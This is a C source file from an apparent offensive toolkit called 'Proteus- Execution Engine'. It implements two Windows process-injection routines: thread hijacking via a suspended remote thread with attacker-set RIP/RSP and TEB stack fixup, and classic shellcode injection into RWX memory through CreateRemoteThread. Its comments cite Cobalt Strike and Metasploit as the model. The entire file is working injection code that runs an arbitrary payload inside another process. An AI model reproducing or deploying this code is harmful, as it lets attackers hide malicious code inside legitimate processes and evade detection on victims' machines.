/* ============================================================================
 * Proteus- Execution Engine -- other_injections.c
 *
 * Thread hijacking via the "suspended thread creation" technique.
 *
 * Why not SetThreadContext on an existing thread?
 *   Threads blocked inside a syscall (e.g. notepad's main thread in
 *   NtUserWaitMessage) do not use the saved user context when the syscall
 *   returns -- the kernel uses the trap frame. SetThreadContext is silently
 *   ignored. QueueUserAPC / PostThreadMessage / NtAlertThread do not fix
 *   this because the wait is not alertable.
 *
 * The reliable production pattern (Cobalt Strike shinject, Metasploit migrate):
 *   CreateRemoteThread(..., CREATE_SUSPENDED) -> the thread is parked at
 *   thread-start with a user-mode initial context we fully control. Set
 *   RIP/RSP, fix up TEB, ResumeThread. The kernel applies the context
 *   because the thread never entered a syscall.
 * ============================================================================ */

#include "../include/injection.h"
#include "../include/pal.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

typedef LONG (NTAPI *pNtQueryInformationThread)(HANDLE, DWORD, PVOID, ULONG, PULONG);

static int fixup_teb(HANDLE hProcess, HANDLE hThread,
                     ULONG_PTR stack_base, ULONG_PTR stack_limit)
{
#ifdef _WIN64
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;
    pNtQueryInformationThread NtQIT =
        (pNtQueryInformationThread)GetProcAddress(ntdll, "NtQueryInformationThread");
    if (!NtQIT) return -2;

    struct { LONG ExitStatus; PVOID TebBaseAddress; HANDLE UniqueProcess; HANDLE UniqueThread;
             PVOID AffinityMask; LONG Priority; LONG BasePriority; } tbi = {0};
    ULONG ret_len = 0;
    if (NtQIT(hThread, 0, &tbi, sizeof(tbi), &ret_len) != 0) return -3;

    ULONG_PTR teb = (ULONG_PTR)tbi.TebBaseAddress;
    if (!teb) return -4;

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, (LPVOID)(teb + 0x08),
                            &stack_base, sizeof(ULONG_PTR), &written)) return -5;
    if (!WriteProcessMemory(hProcess, (LPVOID)(teb + 0x10),
                            &stack_limit, sizeof(ULONG_PTR), &written)) return -6;
    if (!WriteProcessMemory(hProcess, (LPVOID)(teb + 0x1478),
                            &stack_base, sizeof(ULONG_PTR), &written)) return -7;
    return 0;
#else
    (void)hProcess; (void)hThread; (void)stack_base; (void)stack_limit;
    return -99;
#endif
}

/* Hijack semantic: attach to an existing process (by PID or spawn it),
 * allocate payload + fresh stack, then run the payload via a suspended
 * remote thread whose context we fully control.
 *
 * This is "thread hijacking" in the sense that we are hijacking the
 * initial execution context of a thread we create, bypassing the
 * unreliable suspend+SetThreadContext dance on foreign threads. */
int perform_thread_hijacking(InjectionConfig* config) {
    if (!config || !config->payload || config->payloadSize == 0) return -1;

    HANDLE hProcess = NULL;
    DWORD pid = config->targetPid;
    BOOL createdSuspended = FALSE;

    if (pid == 0) {
        STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si);
        if (!CreateProcessA(NULL, (LPSTR)config->targetImage, NULL, NULL, FALSE,
                            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            LOG_ERROR("[-] CreateProcess failed: %lu", GetLastError());
            return -1;
        }
        pid = pi.dwProcessId;
        hProcess = pi.hProcess;
        createdSuspended = TRUE;
        CloseHandle(pi.hThread);
    } else {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            LOG_ERROR("[-] OpenProcess failed: %lu", GetLastError());
            return -1;
        }
    }
    LOG_INFO("[+] Target process PID: %lu", pid);

    /* Note the "main thread" for logging consistency with the old version.
     * We no longer hijack it directly -- we log what would have been
     * targeted, then use the reliable path. */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = {0}; te.dwSize = sizeof(te);
        if (Thread32First(hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == pid) {
                    LOG_INFO("[*] Existing thread TID=%lu (not modified)", te.th32ThreadID);
                    break;
                }
            } while (Thread32Next(hSnap, &te));
        }
        CloseHandle(hSnap);
    }

    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, config->payloadSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        LOG_ERROR("[-] payload VirtualAllocEx failed: %lu", GetLastError());
        goto fail_proc;
    }
    if (!WriteProcessMemory(hProcess, remoteMem, config->payload, config->payloadSize, NULL)) {
        LOG_ERROR("[-] WriteProcessMemory(payload) failed: %lu", GetLastError());
        goto fail_mem;
    }
    LOG_INFO("[+] Payload (%zu bytes) written to %p", config->payloadSize, remoteMem);

    SIZE_T stackSize = 0x100000;
    LPVOID remoteStack = VirtualAllocEx(hProcess, NULL, stackSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteStack) {
        LOG_ERROR("[-] stack VirtualAllocEx failed: %lu", GetLastError());
        goto fail_mem;
    }

    ULONG_PTR stackTop = ((ULONG_PTR)remoteStack + stackSize) & ~(ULONG_PTR)0xF;
    stackTop -= 8;

    LPVOID pExitProcess = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitProcess");
    WriteProcessMemory(hProcess, (LPVOID)stackTop, &pExitProcess, sizeof(pExitProcess), NULL);

    /* ---- Create suspended remote thread; its initial context is ours to set ---- */
    DWORD tid = 0;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)(uintptr_t)remoteMem, NULL, CREATE_SUSPENDED, &tid);
    if (!hThread) {
        LOG_ERROR("[-] CreateRemoteThread(suspended) failed: %lu", GetLastError());
        goto fail_stack;
    }
    LOG_INFO("[+] Created suspended remote thread TID %lu", tid);

    CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        LOG_ERROR("[-] GetThreadContext failed: %lu", GetLastError());
        TerminateThread(hThread, 1);
        CloseHandle(hThread);
        goto fail_stack;
    }
#ifdef _WIN64
    ctx.Rsp = (DWORD64)stackTop;
    ctx.Rip = (DWORD64)remoteMem;
#else
    ctx.Esp = (DWORD)stackTop;
    ctx.Eip = (DWORD)remoteMem;
#endif
    if (!SetThreadContext(hThread, &ctx)) {
        LOG_ERROR("[-] SetThreadContext failed: %lu", GetLastError());
        TerminateThread(hThread, 1);
        CloseHandle(hThread);
        goto fail_stack;
    }
    LOG_INFO("[+] RSP=%p RIP=%p (context set on suspended thread)",
             (void*)stackTop, remoteMem);

    int fix_rc = fixup_teb(hProcess, hThread,
                           (ULONG_PTR)remoteStack + stackSize,
                           (ULONG_PTR)remoteStack);
    LOG_INFO("[%s] TEB stack fixup rc=%d", fix_rc == 0 ? "+" : "-", fix_rc);

    if (createdSuspended) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        typedef LONG (NTAPI *NtResumeProcess_t)(HANDLE);
        NtResumeProcess_t fn = (NtResumeProcess_t)GetProcAddress(hNtdll, "NtResumeProcess");
        if (fn) fn(hProcess);
    }

    DWORD prev = ResumeThread(hThread);
    if (prev == (DWORD)-1) {
        LOG_ERROR("[-] ResumeThread failed: %lu", GetLastError());
        TerminateThread(hThread, 1);
        CloseHandle(hThread);
        goto fail_stack;
    }
    LOG_INFO("[+] Remote thread resumed (previous suspend count = %lu). Injection complete.", prev);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;

fail_stack:
    VirtualFreeEx(hProcess, remoteStack, 0, MEM_RELEASE);
fail_mem:
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
fail_proc:
    if (createdSuspended) TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return -1;
}

int perform_shellcode_injection(InjectionConfig* config) {
    if (!config || !config->payload || config->payloadSize == 0) return -1;
    HANDLE hProcess = NULL;
    DWORD pid = config->targetPid;
    BOOL createdSuspended = FALSE;
    if (pid == 0) {
        STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si);
        if (!CreateProcessA(NULL, (LPSTR)config->targetImage, NULL, NULL, FALSE,
                            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return -1;
        pid = pi.dwProcessId; hProcess = pi.hProcess; createdSuspended = TRUE;
        CloseHandle(pi.hThread);
    } else {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) return -1;
    }
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, config->payloadSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) { if (createdSuspended) TerminateProcess(hProcess, 1); CloseHandle(hProcess); return -1; }
    if (!WriteProcessMemory(hProcess, remoteMem, config->payload, config->payloadSize, NULL)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        if (createdSuspended) TerminateProcess(hProcess, 1);
        CloseHandle(hProcess); return -1;
    }
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)(uintptr_t)remoteMem, NULL, 0, NULL);
    if (!hRemoteThread) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        if (createdSuspended) TerminateProcess(hProcess, 1);
        CloseHandle(hProcess); return -1;
    }
    if (createdSuspended) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        typedef LONG (NTAPI *NtResumeProcess_t)(HANDLE);
        NtResumeProcess_t fn = (NtResumeProcess_t)GetProcAddress(hNtdll, "NtResumeProcess");
        if (fn) fn(hProcess);
    }
    WaitForSingleObject(hRemoteThread, 5000);
    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);
    LOG_INFO("[+] Shellcode injection completed");
    return 0;
}

#else
int perform_thread_hijacking(InjectionConfig* config) { (void)config; return -1; }
int perform_shellcode_injection(InjectionConfig* config) { (void)config; return -1; }
#endif
